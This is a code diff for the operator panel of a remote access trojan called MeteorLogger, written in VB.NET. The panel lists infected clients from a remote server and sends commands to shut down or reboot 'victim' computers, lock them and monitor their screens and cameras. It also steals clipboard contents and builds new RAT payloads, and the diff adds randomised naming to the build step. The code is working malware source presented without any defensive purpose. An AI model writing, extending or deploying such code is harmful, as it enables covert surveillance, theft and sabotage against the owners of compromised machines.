@@ -7,10 +7,23 @@ Imports System.ComponentModel
 Public Class RatPanel
     Private mainWebClient As New WebClient()
     Private demandsClosing As Boolean = False
+
+    Public Function GetRandomString()
+        Dim p As String = Path.GetRandomFileName()
+        p = p.Replace(".", "")
+        Return p
+    End Function
     Private Sub RatPanel_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
         ClientListManager.RunWorkerAsync()
     End Sub
+
+    Private Sub RatPanel_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
+        demandsClosing = True
+        ClientListManager.CancelAsync()
+        End
+    End Sub
+
     Private Sub AddLogMessage(message As String)
         Log.Items.Add(message)
     End Sub
@@ -22,8 +35,17 @@ Public Class RatPanel
             Try
                 clientInfoList = Split(New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=cleanit"), "[;;]")
             Catch ex As WebException
-                MsgBox("Unable to connect to the FTP server." & ControlChars.Lf & "FTP: " & My.Settings.vpsurl, MsgBoxStyle.Exclamation)
-                End
+                Dim errMessage = MsgBox("Unable to connect to the FTP server." & vbCrLf &
+                       "FTP: " & My.Settings.vpsurl & vbCrLf & vbCrLf &
+                       "Do you want to modify it ?", MsgBoxStyle.YesNo)
+
+                If errMessage = MsgBoxResult.Yes Then
+                    My.Settings.Reset()
+                    ServerCheck.Show()
+                    Exit While
+                Else
+                    End
+                End If
             End Try
 
             Invoke(Sub() connectedClientsView.Rows.Clear())
@@ -86,7 +108,7 @@ Public Class RatPanel
     ''' This function automatically grabs the target IP,
     ''' then asks for safety and finally proceed to a direct command query on the HTTP server
     ''' </summary>
-    Private Sub runDirectPanelCommand(message As String,
+    Private Sub RunDirectPanelCommand(message As String,
                                       actionType As String,
                                       actionContent As String())
 
@@ -96,38 +118,34 @@ Public Class RatPanel
 
         For Each _data In actionContent
             If _data.Contains(" ") Then _data = """" & _data & """"
-
             If contentNum = 1 Then
                 actionContentParsed &= "&actioncontent=" & _data
             Else
                 actionContentParsed &= "&actioncontent" & contentNum & "=" & _data
             End If
-
             contentNum += 1
         Next
 
         If MsgBox(message, MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
-            For i = 0 To 5
-                mainWebClient.DownloadString(
-                    My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed
-                )
-
+            For i = 0 To 5 ' Spam request to stub
+                mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed)
+                System.Threading.Thread.Sleep(50)
             Next
         End If
     End Sub
 
     Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
+        RunDirectPanelCommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
                               {"shutdown /s /f /t 0"})
     End Sub
 
     Private Sub RebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RebootToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
+        RunDirectPanelCommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
                               {"shutdown /r /f /t 0"})
     End Sub
 
     Private Sub RATShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATShutdownToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
+        RunDirectPanelCommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
     End Sub
 
     Private Sub ScreenMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenMonitorToolStripMenuItem.Click
@@ -146,9 +164,7 @@ Public Class RatPanel
         Dim form As New RemoteChat()
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
         form.Show()
-
-        mainWebClient.DownloadString(
-                My.Settings.vpsurl & "clients.php?action=senddata&target=" & form.targetIp & "&actiontype=openremotechat")
+        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & form.targetIp & "&actiontype=openremotechat")
     End Sub
     Private Sub CameraMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CameraMonitorToolStripMenuItem.Click
         ' TODO : add multiple window support
@@ -160,19 +176,58 @@ Public Class RatPanel
     End Sub
 
     Private Sub RATRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATRebootToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
+        RunDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
     End Sub
-#End Region
+
     Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
-        runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
-
+        RunDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
     End Sub
 
-    Private Sub RatPanel_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
-        demandsClosing = True
-        ClientListManager.CancelAsync()
+    Private Sub UserBlacklistToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UserBlacklistToolStripMenuItem.Click
+        Dim form As New Blacklist
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
     End Sub
 
+    Private Sub CDOpenAndCloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CDOpenAndCloseToolStripMenuItem.Click
+        Dim form As New OpenCloseCD()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+
+    Private Sub OpenURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles OpenURLToolStripMenuItem1.Click
+        Dim form As New OpenURL()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub PlayMP3InBackgroundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlayMP3InBackgroundToolStripMenuItem.Click
+        Dim form As New MP3Player()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub LockVictimPCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockVictimPCToolStripMenuItem.Click
+        Dim form As New LockPC()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
+        Dim form As New TaskMgr()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub GetClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetClipboardToolStripMenuItem.Click
+        Dim form As New GetClipboard()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub AdvancedVictimStatisticsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AdvancedVictimStatisticsToolStripMenuItem.Click
+        Dim form As New AdvancedStats()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+
+
+#End Region
 #Region "UnspecificEvents"
     Private Sub BuildButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildButton.Click
         Dim saveFile As New SaveFileDialog
@@ -197,23 +252,38 @@ Public Class RatPanel
             FileClose(2)
 #End Region
 
+
+            Dim randomnamespace As String = GetRandomString()
+            Dim randomdownloadstringname As String = GetRandomString()
+            Dim randomstringdownload As String = GetRandomString()
+            Dim randomdownloadername As String = GetRandomString()
+            '  Dim namespace As String = GetRandomString()
+            Dim exename = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=buildrat")
+
+            ' TODO
+
             AddLogMessage("Built !")
             'MsgBox("Your RAT was saved successfully !", MsgBoxStyle.Information, "Success - MeteorLogger")
+
         End If
     End Sub
 
     Private Sub PingButton_Click(sender As Object, e As EventArgs) Handles PingButton.Click
         Dim pingThread As New Threading.Thread(Sub() Shell("cmd.exe /c ping " & My.Settings.vpsurl.Split("/")(2) & " -t",
-                AppWinStyle.NormalFocus, True))
+        AppWinStyle.NormalFocus, True))
         pingThread.Start()
+
     End Sub
 
     Private Sub Button1_Click(sender As Object, e As EventArgs)
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
     End Sub
 
+    Private Sub ClientListTimer_Tick(sender As Object, e As EventArgs) Handles ClientListTimer.Tick
+
+    End Sub
+
 
 
 #End Region
-
 End Class
